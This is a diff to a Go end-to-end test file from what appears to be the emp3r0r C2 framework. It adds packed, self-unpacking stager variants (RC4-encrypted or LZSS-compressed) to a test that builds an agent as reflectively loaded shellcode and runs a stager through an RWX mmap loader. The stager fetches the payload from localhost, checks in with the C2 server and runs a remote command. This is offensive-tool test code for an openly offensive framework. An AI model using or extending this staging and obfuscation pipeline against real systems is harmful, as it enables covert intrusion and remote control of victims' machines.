@@ -42,7 +42,26 @@ import (
 	"github.com/sliverarmory/malasada"
 )
 
-// signUUID signs the agent UUID with the CA private key
+// stagerOpts controls which stager variant build.sh produces.
+type stagerOpts struct {
+	// format is the --stager-format argument: "shellcode" (raw) or "packed".
+	format string
+	// unpacker selects the self-unpacking algorithm when format == "packed":
+	// "rc4" (encrypted) or "lzss" (compressed).  Ignored for raw format.
+	unpacker string
+	// transport is the --transport argument passed to build.sh.
+	transport string
+}
+
+// artifactName returns the filename that build.sh produces for these options.
+func (o stagerOpts) artifactName() string {
+	if o.format == "packed" {
+		return "stager-packed.bin"
+	}
+	return "stager.bin"
+}
+
+// signUUID signs the agent UUID with the CA private key.
 func signUUID(uuidStr, keyFile string) (string, error) {
 	keyBytes, err := os.ReadFile(keyFile)
 	if err != nil {
@@ -65,6 +84,12 @@ func signUUID(uuidStr, keyFile string) (string, error) {
 	return base64.URLEncoding.EncodeToString(sig), nil
 }
 
+// ---------------------------------------------------------------------------
+// Top-level tests
+// ---------------------------------------------------------------------------
+
+// TestAgentEndToEndLifecycle exercises the raw (unpacked) stager over all
+// supported C2 modes and download transports.
 func TestAgentEndToEndLifecycle(t *testing.T) {
 	if os.Getenv("CGO_ENABLED") != "1" {
 		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
@@ -75,17 +100,58 @@ func TestAgentEndToEndLifecycle(t *testing.T) {
 	transports := []string{"http", "libcurl"}
 	for _, mode := range []string{def.C2ChannelModeH2Conn, "http_poll"} {
 		for _, tr := range transports {
-			mode := mode
-			tr := tr
+			mode, tr := mode, tr
 			t.Run(mode+"/"+tr, func(t *testing.T) {
-				runAgentEndToEndLifecycle(t, mode, tr)
+				opts := stagerOpts{format: "shellcode", transport: tr}
+				runAgentEndToEndLifecycle(t, mode, opts)
 			})
 		}
 	}
 }
 
-func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
+// TestPackerEndToEnd exercises the self-unpacking packed stager for each
+// combination of unpacking algorithm (rc4, lzss) and download transport
+// (http, libcurl).  Every variant must decrypt/decompress itself, jump to the
+// inner stager, download the malasada payload, and produce an agent check-in
+// followed by a successful command round-trip with a live runner process.
+//
+// A single C2 mode (H2Conn) is used; the raw lifecycle tests cover mode ×
+// transport combinations independently.
+func TestPackerEndToEnd(t *testing.T) {
+	if os.Getenv("CGO_ENABLED") != "1" {
+		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
+	}
+	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
+		t.Skip("Skipping test: race detector is enabled")
+	}
+	for _, unpacker := range []string{"rc4", "lzss"} {
+		for _, tr := range []string{"http", "libcurl"} {
+			unpacker, tr := unpacker, tr
+			t.Run("packed/"+unpacker+"/"+tr, func(t *testing.T) {
+				opts := stagerOpts{
+					format:    "packed",
+					unpacker:  unpacker,
+					transport: tr,
+				}
+				runAgentEndToEndLifecycle(t, def.C2ChannelModeH2Conn, opts)
+			})
+		}
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Shared lifecycle implementation
+// ---------------------------------------------------------------------------
+
+// runAgentEndToEndLifecycle is the full end-to-end test driver.  It is
+// parameterised by C2 mode and stager options so it can be reused by both
+// the raw and packed test suites.
+func runAgentEndToEndLifecycle(t *testing.T, mode string, opts stagerOpts) {
+	t.Helper()
+
+	// -----------------------------------------------------------------------
 	// 1. Setup workspace
+	// -----------------------------------------------------------------------
 	tmpDir, err := os.MkdirTemp("", "stager_test_*")
 	if err != nil {
 		t.Fatalf("Failed to create temp dir: %v", err)
@@ -93,6 +159,7 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	defer os.RemoveAll(tmpDir)
 	logging.Infof("Test workspace: %s", tmpDir)
 
+	// -----------------------------------------------------------------------
 	// 2. Build agent as ELF shared library (-buildmode=c-shared).
 	//
 	// Parameters mirror build.sh's build_shared_object() for linux/amd64:
@@ -103,6 +170,7 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	//   - extldflags: -Wl,--gc-sections -s
 	// "emp3r0r_so" activates main_cgo_shared.go which exports the `main`
 	// symbol that malasada's stage0 calls after reflective loading.
+	// -----------------------------------------------------------------------
 	agentSOPath := filepath.Join(tmpDir, "agent.so")
 	cmdBuildAgent := exec.Command(
 		"go", "build",
@@ -121,9 +189,11 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	}
 	logging.Successf("Agent shared library built at %s", agentSOPath)
 
+	// -----------------------------------------------------------------------
 	// 3. Setup C2 server config and certs.
 	//    Must happen before malasada conversion so we can embed the real config
 	//    into the .so before compression.
+	// -----------------------------------------------------------------------
 	c2Port := util.RandInt(50000, 60000)
 	c2PortStr := fmt.Sprintf("%d", c2Port)
 
@@ -202,6 +272,7 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	live.AgentList = make([]*def.Emp3r0rAgent, 0)
 	time.Sleep(100 * time.Millisecond)
 
+	// -----------------------------------------------------------------------
 	// 4. Encrypt config and patch the placeholder into the raw .so.
 	//
 	// IMPORTANT: patch BEFORE calling malasada.ConvertSharedObject so the
@@ -209,6 +280,7 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	// Patching after compression fails because aplib collapses the 4096-byte
 	// run of 0xff into a short back-reference — the literal placeholder no
 	// longer exists in the output blob.
+	// -----------------------------------------------------------------------
 	cfg := &def.Config{
 		CCAddress:        "127.0.0.1",
 		CCH2Port:         c2PortStr,
@@ -259,11 +331,13 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	}
 	logging.Successf("agent.so patched with config (%d bytes)", len(patchedSOBytes))
 
+	// -----------------------------------------------------------------------
 	// 5. Convert the patched .so to a malasada reflective-ELF blob.
 	//
 	// Output layout: [malasada stage0 shellcode][aplib-compressed patched .so]
 	// The stage0 entry convention matches downloader.c:
 	//   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
+	// -----------------------------------------------------------------------
 	malasadaPayload, err := malasada.ConvertSharedObject(patchedSOPath, "main", true)
 	if err != nil {
 		t.Fatalf("malasada.ConvertSharedObject failed: %v", err)
@@ -276,7 +350,9 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	}
 	logging.Successf("Malasada payload ready")
 
+	// -----------------------------------------------------------------------
 	// 6. Start C2 server
+	// -----------------------------------------------------------------------
 	server.OPERATORS.Store("dummy", nil)
 	if network.EmpTLSServer != nil {
 		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
@@ -296,53 +372,101 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	}()
 	time.Sleep(2 * time.Second)
 
-	// 6. Build stager.bin (downloader shellcode)
+	// -----------------------------------------------------------------------
+	// 7. Build the stager shellcode via build.sh.
 	//
-	// downloader.c downloads the malasada payload, RC4-decrypts it (same key
-	// derivation as buildServedBlob), then calls:
-	//   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
-	//   entry(stage_blob, downloaded_size);
-	// The malasada stage0 at the front of the blob handles the rest.
+	// For the raw format, build.sh produces stager.bin — the downloader
+	// shellcode that fetches and RC4-decrypts the malasada payload then jumps
+	// to it.
+	//
+	// For the packed format, build.sh additionally links the self-unpacking
+	// stub (unpack_stub_<unpacker>.c) around the inner stager and runs the
+	// matching packer script (pack_<unpacker>.py).  The result is
+	// stager-packed.bin: a blob whose first bytes are the unpack stub's
+	// _start, which decrypts/decompresses the inner stager in-place and
+	// jumps to it, producing the same execution flow as the raw case but
+	// with an additional obfuscation layer.
+	//
+	// Both variants are run identically: mmap RWX, copy, call offset 0.
+	// -----------------------------------------------------------------------
 	stagerListenerPort := util.RandInt(60001, 65000)
 	stagerPortStr := fmt.Sprintf("%d", stagerListenerPort)
 	stagerKey := "password123"
 
-	buildCmd := exec.Command(
-		"./build.sh",
+	buildArgs := []string{
 		"--download-host", "127.0.0.1",
 		"--download-port", stagerPortStr,
 		"--download-path", "/",
 		"--download-key", stagerKey,
-		"--stager-format", "shellcode",
-		"--transport", tr,
+		"--stager-format", opts.format,
+		"--transport", opts.transport,
 		"--debug",
-	)
+	}
+	if opts.format == "packed" && opts.unpacker != "" {
+		buildArgs = append(buildArgs, "--unpacker", opts.unpacker)
+	}
+
+	buildCmd := exec.Command("./build.sh", buildArgs...)
 	buildCmd.Dir = ".."
 	buildCmd.Env = append(os.Environ(), "CGO_ENABLED=0")
 	out, err = buildCmd.CombinedOutput()
 	if err != nil {
 		t.Fatalf("build.sh failed: %v\nOutput: %s", err, string(out))
 	}
-	logging.Successf("Stager compiled successfully via build.sh (%s)", tr)
+	logging.Successf("Stager compiled (%s format, %s unpacker, %s transport)",
+		opts.format, opts.unpacker, opts.transport)
 
-	stagerArtifact := filepath.Join(tmpDir, "stager.bin")
-	input, err := os.ReadFile("../stager.bin")
+	// The artifact filename differs between raw and packed.
+	srcArtifact := filepath.Join("..", opts.artifactName())
+	stagerArtifact := filepath.Join(tmpDir, "stager_artifact.bin")
+	input, err := os.ReadFile(srcArtifact)
 	if err != nil {
-		t.Fatalf("Failed to read stager.bin: %v", err)
+		t.Fatalf("Failed to read %s: %v", opts.artifactName(), err)
 	}
 	if err := os.WriteFile(stagerArtifact, input, 0o755); err != nil {
-		t.Fatalf("Failed to copy stager.bin to tmp: %v", err)
+		t.Fatalf("Failed to copy %s to tmp: %v", opts.artifactName(), err)
 	}
-	logging.Infof("Stage 0 stager size: %d bytes", len(input))
-	os.Remove("../stager.bin")
+	logging.Infof("Stage-0 artifact: %s (%d bytes)", opts.artifactName(), len(input))
 
-	// 7. Start listener
+	// Sanity-check the packed artifact size.
 	//
-	// buildServedBlob encrypts the payload with the key-derived RC4 stream —
-	// matching the rc4_crypt call in downloader_main.  compression=false
-	// because the malasada payload is already position-independent shellcode;
-	// compressing it a second time buys little and would require a second
-	// decompressor.
+	// RC4 encrypts without compressing, so the packed blob is always the inner
+	// stager size PLUS the unpack stub overhead (≥400 bytes); it must be
+	// strictly larger than the raw stager.
+	//
+	// LZSS compresses, so the packed blob can be *smaller* than the raw stager
+	// when the compression ratio is good enough to offset the stub overhead.
+	// For LZSS we only assert that a non-trivial blob was produced.
+	if opts.format == "packed" {
+		rawArtifact := filepath.Join("..", "stager.bin")
+		rawBytes, _ := os.ReadFile(rawArtifact)
+		switch opts.unpacker {
+		case "rc4":
+			if len(rawBytes) > 0 && len(input) <= len(rawBytes) {
+				t.Errorf("rc4 packed stager (%d bytes) should be larger than raw stager (%d bytes) — packing may have failed",
+					len(input), len(rawBytes))
+			}
+		case "lzss":
+			// The unpack stub alone is ~290 bytes; a valid packed blob must be
+			// at least that size plus a few bytes of compressed payload.
+			const minLZSSSize = 300
+			if len(input) < minLZSSSize {
+				t.Errorf("lzss packed stager (%d bytes) is suspiciously small (< %d) — packing may have failed",
+					len(input), minLZSSSize)
+			}
+		}
+	}
+
+	// Remove the build artefact from the source tree so the next test run
+	// starts from a clean state.
+	os.Remove(srcArtifact)
+
+	// -----------------------------------------------------------------------
+	// 8. Start payload listener.
+	//
+	// buildServedBlob RC4-encrypts the malasada payload with the key derived
+	// from stagerKey — matching rc4_crypt in downloader_main.
+	// -----------------------------------------------------------------------
 	go func() {
 		if err := listener.HTTPListener(payloadPath, stagerPortStr, stagerKey); err != nil {
 			logging.Errorf("Stager listener failed: %v", err)
@@ -362,10 +486,11 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 		t.Fatalf("Stager listener failed to start on port %s", stagerPortStr)
 	}
 
-	// 8. Build a thin runner that mmap's the raw stager shellcode and calls it.
-	// stager.bin has its own _start (assembled in downloader.c) so we simply
-	// mmap it RWX and call it with no arguments — the downloader sets up its
-	// own stack frame internally.
+	// -----------------------------------------------------------------------
+	// 9. Build a thin C runner that mmap's the stager shellcode and jumps to
+	// it.  Both raw and packed stagers have _start at offset 0 of the blob,
+	// so the runner is format-agnostic.
+	// -----------------------------------------------------------------------
 	runnerSrc := filepath.Join(tmpDir, "stager_runner.c")
 	runnerBin := filepath.Join(tmpDir, "stager_runner")
 	runnerCode := "#define _GNU_SOURCE\n" +
@@ -379,7 +504,7 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 		"    int fd = open(argv[1], O_RDONLY);\n" +
 		"    if (fd < 0) { perror(\"open\"); return 1; }\n" +
 		"    long size = lseek(fd, 0, SEEK_END); lseek(fd, 0, SEEK_SET);\n" +
-		"    fprintf(stderr, \"[runner] stager.bin: %ld bytes\\n\", size);\n" +
+		"    fprintf(stderr, \"[runner] stager artifact: %ld bytes\\n\", size);\n" +
 		"    void *buf = mmap(NULL, (size_t)size, PROT_READ|PROT_WRITE|PROT_EXEC,\n" +
 		"                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n" +
 		"    if (buf == (void*)-1) { perror(\"mmap\"); close(fd); return 1; }\n" +
@@ -398,7 +523,8 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 
 	var stdout, stderr bytes.Buffer
 	cmdRunner := exec.Command(runnerBin, stagerArtifact)
-	logging.Infof("Running stager runner (%s)...", tr)
+	logging.Infof("Running stager runner (format=%s unpacker=%s transport=%s)...",
+		opts.format, opts.unpacker, opts.transport)
 
 	cmdRunner.Stdout = &stdout
 	cmdRunner.Stderr = &stderr
@@ -413,7 +539,9 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	doneChan := make(chan error, 1)
 	go func() { doneChan <- cmdRunner.Wait() }()
 
-	// 10. Wait for agent check-in
+	// -----------------------------------------------------------------------
+	// 10. Wait for agent check-in.
+	// -----------------------------------------------------------------------
 	timeout := 60 * time.Second
 	start := time.Now()
 	var agent *def.Emp3r0rAgent
@@ -446,7 +574,9 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 		time.Sleep(100 * time.Millisecond)
 	}
 
-	// 11. Verify command execution
+	// -----------------------------------------------------------------------
+	// 11. Verify command execution.
+	// -----------------------------------------------------------------------
 	logging.Infof("Verifying command execution...")
 	job := jobs.CreateJob("ls", "command", agent.Tag)
 	cmdID := job.ID
@@ -478,12 +608,14 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 	}
 	logging.Println("Command output verification passed.")
 
-	// 12. Restart / reconnection test
+	// -----------------------------------------------------------------------
+	// 12. Restart / reconnection test.
 	//
 	// With the malasada pipeline the agent runs in-process inside the runner
 	// (no separate child process).  We attempt to find a child PID; if none is
 	// found we skip the kill-and-reconnect sub-test but still verify the runner
 	// is alive.
+	// -----------------------------------------------------------------------
 	logging.Infof("Testing restart/reconnection...")
 	runnerPid := cmdRunner.Process.Pid
 	entries, err := os.ReadDir("/proc")
@@ -582,7 +714,9 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 		}
 	}
 
-	// Final: verify runner is still alive
+	// -----------------------------------------------------------------------
+	// Final: verify runner is still alive.
+	// -----------------------------------------------------------------------
 	select {
 	case err := <-doneChan:
 		logging.Debugf("Runner Stdout:\n%s", stdout.String())
@@ -592,9 +726,12 @@ func runAgentEndToEndLifecycle(t *testing.T, mode, tr string) {
 		logging.Println("Stager runner still running — test passed.")
 	}
 
-	logging.Successf("TestAgentEndToEndLifecycle PASSED")
+	logging.Successf("runAgentEndToEndLifecycle PASSED (format=%s unpacker=%s mode=%s transport=%s)",
+		opts.format, opts.unpacker, mode, opts.transport)
 
+	// -----------------------------------------------------------------------
 	// Cleanup
+	// -----------------------------------------------------------------------
 	cmdRunner.Process.Kill()
 	listener.StopHTTP()
 	if network.EmpTLSServer != nil {
